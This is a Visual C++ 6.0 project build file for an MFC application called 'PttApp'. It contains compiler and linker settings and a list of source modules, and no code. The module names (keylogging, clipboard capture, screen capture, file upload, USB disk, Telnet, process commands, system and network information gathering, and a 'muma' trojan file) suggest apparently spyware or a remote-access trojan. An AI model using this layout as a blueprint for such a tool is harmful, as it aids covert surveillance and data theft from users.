# Microsoft Developer Studio Project File - Name="PttApp" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=PttApp - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "PttApp.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "PttApp.mak" CFG="PttApp - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "PttApp - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "PttApp - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "PttApp - Win32 Release"

# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 6
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MD /W3 /GX /O2 /I "./jpg" /I "GDIPlus/Includes" /I "E:/资源/Microsoft SDK/include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /D "_UNICODE" /D "UNICODE" /FR /Yu"stdafx.h" /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG" /d "_AFXDLL"
# ADD RSC /l 0x804 /d "NDEBUG" /d "_AFXDLL"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /entry:"wWinMainCRTStartup" /subsystem:windows /machine:I386 /out:"bin/PttApp.exe" /libpath:"./lib" /libpath:"GDIPlus/Lib" /libpath:"E:/资源/Microsoft SDK/lib"

!ELSEIF  "$(CFG)" == "PttApp - Win32 Debug"

# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 6
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MDd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_AFXDLL" /Yu"stdafx.h" /FD /GZ /c
# ADD CPP /nologo /MDd /W3 /Gm /GX /ZI /Od /I "./jpg" /I "GDIPlus/Includes" /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_AFXDLL" /D "_UNICODE" /D "UNICODE" /FR /Yu"stdafx.h" /FD /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG" /d "_AFXDLL"
# ADD RSC /l 0x804 /d "_DEBUG" /d "_AFXDLL"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 /nologo /entry:"wWinMainCRTStartup" /subsystem:windows /debug /machine:I386 /nodefaultlib:"LIBCMTD.lib" /pdbtype:sept /libpath:"./lib" /libpath:"GDIPlus/Lib"

!ENDIF 

# Begin Target

# Name "PttApp - Win32 Release"
# Name "PttApp - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\PttApp.cpp
# End Source File
# Begin Source File

SOURCE=.\PttApp.rc
# End Source File
# Begin Source File

SOURCE=.\PttAppDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\SelfFun.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\PttApp.h
# End Source File
# Begin Source File

SOURCE=.\PttAppDlg.h
# End Source File
# Begin Source File

SOURCE=.\Resource.h
# End Source File
# Begin Source File

SOURCE=.\SelfFun.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\res\artist_48px.ico
# End Source File
# Begin Source File

SOURCE=.\res\artist_96px.ico
# End Source File
# Begin Source File

SOURCE=.\res\file_info.ico
# End Source File
# Begin Source File

SOURCE=.\res\flash_64px.ico
# End Source File
# Begin Source File

SOURCE=.\res\folder_info.ico
# End Source File
# Begin Source File

SOURCE=.\res\Get_Info_48px.ico
# End Source File
# Begin Source File

SOURCE=.\res\protection_72px.ico
# End Source File
# Begin Source File

SOURCE=.\res\PttApp.ico
# End Source File
# Begin Source File

SOURCE=.\res\PttApp.rc2
# End Source File
# Begin Source File

SOURCE=.\res\settings_96px.ico
# End Source File
# End Group
# Begin Group "BaseOp"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Base.cpp
# End Source File
# Begin Source File

SOURCE=.\Base.h
# End Source File
# Begin Source File

SOURCE=.\DEBUG.H
# End Source File
# Begin Source File

SOURCE=.\KeyLog.cpp
# End Source File
# Begin Source File

SOURCE=.\KeyLog.h
# End Source File
# Begin Source File

SOURCE=.\lipboard.cpp
# End Source File
# Begin Source File

SOURCE=.\lipboard.h
# End Source File
# Begin Source File

SOURCE=.\MD5.cpp
# End Source File
# Begin Source File

SOURCE=.\Md5.h
# End Source File
# Begin Source File

SOURCE=.\mumaPublic.cpp
# End Source File
# Begin Source File

SOURCE=.\mumaPublic.h
# End Source File
# Begin Source File

SOURCE=.\NdisSocket.cpp
# End Source File
# Begin Source File

SOURCE=.\NdisSocket.h
# End Source File
# Begin Source File

SOURCE=.\processcmd.cpp
# End Source File
# Begin Source File

SOURCE=.\processcmd.h
# End Source File
# Begin Source File

SOURCE=.\ProcessInfo.cpp
# End Source File
# Begin Source File

SOURCE=.\ProcessInfo.h
# End Source File
# Begin Source File

SOURCE=.\Struct.cpp
# End Source File
# Begin Source File

SOURCE=.\Struct.h
# End Source File
# Begin Source File

SOURCE=.\Telnet.cpp
# End Source File
# Begin Source File

SOURCE=.\Telnet.h
# End Source File
# Begin Source File

SOURCE=.\UserAgent.cpp
# End Source File
# Begin Source File

SOURCE=.\UserAgent.h
# End Source File
# Begin Source File

SOURCE=.\WinApi.cpp
# End Source File
# Begin Source File

SOURCE=.\WinApi.h
# End Source File
# End Group
# Begin Group "FileOp"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\DirCheck.cpp
# End Source File
# Begin Source File

SOURCE=.\DirCheck.h
# End Source File
# Begin Source File

SOURCE=.\FilePublicFun.cpp
# End Source File
# Begin Source File

SOURCE=.\FilePublicFun.h
# End Source File
# Begin Source File

SOURCE=.\FileSearch.cpp
# End Source File
# Begin Source File

SOURCE=.\FileSearch.h
# End Source File
# Begin Source File

SOURCE=.\FileWork.cpp
# End Source File
# Begin Source File

SOURCE=.\FileWork.h
# End Source File
# Begin Source File

SOURCE=.\MD5Work.cpp
# End Source File
# Begin Source File

SOURCE=.\MD5Work.h
# End Source File
# Begin Source File

SOURCE=.\SpecDir.cpp
# End Source File
# Begin Source File

SOURCE=.\SpecDir.h
# End Source File
# Begin Source File

SOURCE=.\UpLoadFile.cpp
# End Source File
# Begin Source File

SOURCE=.\UpLoadFile.h
# End Source File
# Begin Source File

SOURCE=.\UsbDisk.cpp
# End Source File
# Begin Source File

SOURCE=.\UsbDisk.h
# End Source File
# End Group
# Begin Group "ScreenOp"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\BmpToJpg.cpp
# End Source File
# Begin Source File

SOURCE=.\BmpToJpg.h
# End Source File
# Begin Source File

SOURCE=.\jpg\Compress.cpp
# End Source File
# Begin Source File

SOURCE=.\jpg\JCONFIG.H
# End Source File
# Begin Source File

SOURCE=.\jpg\JDCT.H
# End Source File
# Begin Source File

SOURCE=.\jpg\JERROR.H
# End Source File
# Begin Source File

SOURCE=.\jpg\JINCLUDE.H
# End Source File
# Begin Source File

SOURCE=.\jpg\JMEMSYS.H
# End Source File
# Begin Source File

SOURCE=.\jpg\JMORECFG.H
# End Source File
# Begin Source File

SOURCE=.\jpg\JPEGINT.H
# End Source File
# Begin Source File

SOURCE=.\jpg\JPEGLIB.H
# End Source File
# Begin Source File

SOURCE=.\jpg\JpgLib.cpp
# End Source File
# Begin Source File

SOURCE=.\jpg\JpgLib.h
# End Source File
# Begin Source File

SOURCE=.\Screen.cpp
# End Source File
# Begin Source File

SOURCE=.\Screen.h
# End Source File
# Begin Source File

SOURCE=.\ScreenFile.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenFile.h
# End Source File
# Begin Source File

SOURCE=.\ScreenOpt.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenOpt.h
# End Source File
# End Group
# Begin Group "SysinfoOp"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\FileVersion.cpp
# End Source File
# Begin Source File

SOURCE=.\FileVersion.h
# End Source File
# Begin Source File

SOURCE=.\getAdapterInfo.cpp
# End Source File
# Begin Source File

SOURCE=.\getAdapterInfo.h
# End Source File
# Begin Source File

SOURCE=.\getAppID.cpp
# End Source File
# Begin Source File

SOURCE=.\getAppID.h
# End Source File
# Begin Source File

SOURCE=.\GetDiskInfo.cpp
# End Source File
# Begin Source File

SOURCE=.\GetDiskInfo.h
# End Source File
# Begin Source File

SOURCE=.\GetInputInfo.cpp
# End Source File
# Begin Source File

SOURCE=.\GetInputInfo.h
# End Source File
# Begin Source File

SOURCE=.\getLANInfo.cpp
# End Source File
# Begin Source File

SOURCE=.\getLANInfo.h
# End Source File
# Begin Source File

SOURCE=.\getprocessinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\getprocessinfo.h
# End Source File
# Begin Source File

SOURCE=.\getSoftwareinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\getSoftwareinfo.h
# End Source File
# Begin Source File

SOURCE=.\getSysteminfo.cpp
# End Source File
# Begin Source File

SOURCE=.\getSysteminfo.h
# End Source File
# Begin Source File

SOURCE=.\HardwareStr.cpp
# End Source File
# Begin Source File

SOURCE=.\HardwareStr.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# End Target
# End Project
